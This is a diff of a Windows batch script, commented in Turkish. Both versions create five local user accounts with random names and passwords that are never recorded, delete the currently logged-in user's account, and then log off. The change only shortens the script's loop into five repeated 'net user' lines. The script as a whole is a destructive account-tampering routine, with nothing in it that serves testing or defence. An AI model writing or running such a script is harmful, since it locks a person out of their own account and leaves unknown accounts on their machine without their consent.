@@ -1,29 +1,17 @@
 @echo off
-setlocal enabledelayedexpansion
 
-rem Kullanıcıları oluştur
-for /l %%i in (1,1,5) do (
-    set "username=user!random!"
-    set "password=pass!random!"
-
-    rem Kullanıcı adını ve şifreyi kısalt
-    set "username=!username:~0,8!"
-    set "password=!password:~0,8!"
-
-    rem Kullanıcı oluştur
-    net user !username! !password! /add
-
-    echo Kullanıcı !username! oluşturuldu.
-)
+rem 5 rastgele kullanıcı oluştur
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
+net user %random% %random% /add
 
 echo Tüm kullanıcılar başarıyla oluşturuldu.
 
-rem Mevcut kullanıcıyı sil
-set "current_user=%username%"
-
-rem Mevcut kullanıcıyı silme (Admin yetkisi gerekebilir)
-net user %current_user% /delete
-echo Mevcut kullanıcı %current_user% silindi.
+rem Mevcut oturumdaki kullanıcıyı silme
+net user %username% /delete
+echo Mevcut kullanıcı %username% silindi.
 
 rem Oturumu kapat
 shutdown /l
